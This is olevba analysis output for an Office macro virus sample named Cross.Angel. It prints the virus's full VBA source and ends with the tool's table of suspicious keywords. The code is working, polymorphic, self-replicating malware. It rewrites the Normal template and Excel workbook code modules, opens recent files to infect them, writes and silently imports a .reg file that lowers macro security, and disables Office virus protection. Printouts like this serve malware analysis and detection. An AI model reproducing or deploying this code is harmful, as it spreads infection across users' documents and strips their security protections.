olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Across.b-d25310f1b7822b7781393f165a022e51ff6175c2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Across.b-d25310f1b7822b7781393f165a022e51ff6175c2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const И‚Л•ґ = "' Cross.Angel", ВЎ„џИ = 130, ·јњ¬µ = "9.0", µ¦Ж©· = "Macro", ЉђЄ¤є = "Tools", ѕ‘‡њ‰ = &H1, ѕ‘‡њ‰_ = &H0, ўџ­…† = 0, ©©џ­Ў = 1, °ѓ–Еµ = 12, ўњВЎґ = "excel.application", «ґЙќВ = "DieseArbeitsmappe"
If Application.Version = ·јњ¬µ Then
    Application.CommandBars(µ¦Ж©·).Controls((©©џ­Ў + ©©џ­Ў + ©©џ­Ў)).Enabled = (Rnd * ўџ­…†)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = ѕ‘‡њ‰
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ѕ‘‡њ‰_
    Application.CommandBars(ЉђЄ¤є).Controls(°ѓ–Еµ).Enabled = (Rnd * ўџ­…†)
    Options.VirusProtection = (Rnd * ўџ­…†)
End If
Options.SaveNormalPrompt = (Rnd * ўџ­…†)
€№А©К = »‚°“»(ThisDocument.VBProject.VBComponents(©©џ­Ў).CodeModule.Lines(©©џ­Ў, ВЎ„џИ))
If MacroContainer = ActiveDocument Then Set ИїЛЄЈ = NormalTemplate Else Set ИїЛЄЈ = ActiveDocument
With ИїЛЄЈ.VBProject.VBComponents(©©џ­Ў).CodeModule
    If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
        .DeleteLines ©©џ­Ў, .CountOfLines
        .InsertLines ©©џ­Ў, €№А©К
        If ИїЛЄЈ = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ©©џ­Ў Then
Set …­ —Ё = GetObject(, ўњВЎґ)
If …­ —Ё = "" Then Set …­ —Ё = CreateObject(ўњВЎґ): ў™ўµ” = ©©џ­Ў
If ў™ўµ” <> ©©џ­Ў Then
    For Each КњҐ¤Е In …­ —Ё.Workbooks
       With КњҐ¤Е.VBProject.VBComponents(«ґЙќВ).CodeModule
            If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
                .DeleteLines ©©џ­Ў, .CountOfLines
                .InsertLines ©©џ­Ў, €№А©К
                If КњҐ¤Е.Path <> "" Then КњҐ¤Е.Save Else КњҐ¤Е.SaveAs КњҐ¤Е.FullName
            End If
        End With
    Next
Else
    For КњҐ¤Е = ©©џ­Ў To …­ —Ё.Application.RecentFiles.Maximum
        …­ —Ё.Application.RecentFiles(КњҐ¤Е).Open
            With …­ —Ё.Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(«ґЙќВ).CodeModule
                If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
                    .DeleteLines ©©џ­Ў, .CountOfLines
                    .InsertLines ©©џ­Ў, €№А©К
                End If
            End With
        …­ —Ё.Application.Workbooks(Application.RecentFiles(1).Name).Close ©©џ­Ў
    Next
    …­ —Ё.Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ©©џ­Ў
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ©©џ­Ў Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ©©џ­Ў
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const И‚Л•ґ = "' Cross.Angel", ВЎ„џИ = 130, ·јњ¬µ = "9.0", µ¦Ж©· = "Macro", ЉђЄ¤є = "Tools", ўџ­…† = 0, ©©џ­Ў = 1, °ѓ–Еµ = 10, ўњВЎґ = "word.application", «ґЙќВ = "DieseArbeitsmappe"
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = ·јњ¬µ Then
    Application.CommandBars(µ¦Ж©·).Controls((©©џ­Ў + ©©џ­Ў + ©©џ­Ў)).Enabled = (Rnd * ўџ­…†)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(ЉђЄ¤є).Controls(°ѓ–Еµ).Enabled = (Rnd * ўџ­…†)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
€№А©К = »‚°“»(ThisWorkbook.VBProject.VBComponents(«ґЙќВ).CodeModule.Lines(©©џ­Ў, ВЎ„џИ))
For Each КњҐ¤Е In Application.Workbooks
    With КњҐ¤Е.VBProject.VBComponents(«ґЙќВ).CodeModule
        If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
            .DeleteLines ©©џ­Ў, .CountOfLines
            .InsertLines ©©џ­Ў, €№А©К
            If КњҐ¤Е.Path <> "" Then КњҐ¤Е.Save Else КњҐ¤Е.SaveAs КњҐ¤Е.FullName
        End If
    End With
Next
If Application.Workbooks.Count = ©©џ­Ў Then
    Application.WindowState = xlMinimized
    For КњҐ¤Е = ©©џ­Ў To Application.RecentFiles.Maximum
        Application.RecentFiles(КњҐ¤Е).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(«ґЙќВ).CodeModule
                If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
                    .DeleteLines ©©џ­Ў, .CountOfLines
                    .InsertLines ©©џ­Ў, €№А©К
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close ©©џ­Ў
    Next
End If
Set …­ —Ё = GetObject(, ўњВЎґ)
If …­ —Ё = "" Then Set …­ —Ё = CreateObject(ўњВЎґ): ў™ўµ” = ©©џ­Ў
If …­ —Ё.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ©©џ­Ў Then …­ —Ё.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ©©џ­Ў
If …­ —Ё.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ©©џ­Ў Then
With …­ —Ё.NormalTemplate.VBProject.VBComponents(©©џ­Ў).CodeModule
    If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
        .DeleteLines ©©џ­Ў, .CountOfLines
        .InsertLines ©©џ­Ў, €№А©К
        …­ —Ё.NormalTemplate.Save
        …­ —Ё.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ©©џ­Ў
    End If
End With
End If
If ў™ўµ” = ©©џ­Ў Then …­ —Ё.Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function »‚°“»(€№А©К) 'JSMP v1.2
Dim К…”‹Й(0 To 20): Randomize
“–…Јї = 1: К…”‹Й(0) = "€№А©К": К…”‹Й(1) = "»‚°“»": К…”‹Й(2) = "К…”‹Й": К…”‹Й(3) = "ђґўўј": К…”‹Й(4) = "Џ™Ж‘ў": К…”‹Й(5) = "“–…Јї": К…”‹Й(6) = "И‚Л•ґ": К…”‹Й(7) = "ВЎ„џИ": К…”‹Й(8) = "·јњ¬µ": К…”‹Й(9) = "µ¦Ж©·": К…”‹Й(10) = "ЉђЄ¤є": К…”‹Й(11) = "ѕ‘‡њ‰": К…”‹Й(12) = "ўџ­…†": К…”‹Й(13) = "©©џ­Ў": К…”‹Й(14) = "°ѓ–Еµ": К…”‹Й(15) = "ўњВЎґ": К…”‹Й(16) = "«ґЙќВ": К…”‹Й(17) = "ИїЛЄЈ": К…”‹Й(18) = "…­ —Ё": К…”‹Й(19) = "ў™ўµ”": К…”‹Й(20) = "КњҐ¤Е"
For ђґўўј = 0 To 20
Џ™Ж‘ў = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
“–…Јї = InStr(“–…Јї + 1, €№А©К, К…”‹Й(ђґўўј))
If “–…Јї Then €№А©К = Mid(€№А©К, 1, (“–…Јї - 1)) & Џ™Ж‘ў & Mid(€№А©К, (“–…Јї + Len(К…”‹Й(ђґўўј))), Len(€№А©К))
Loop While “–…Јї
Next
»‚°“» = €№А©К
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

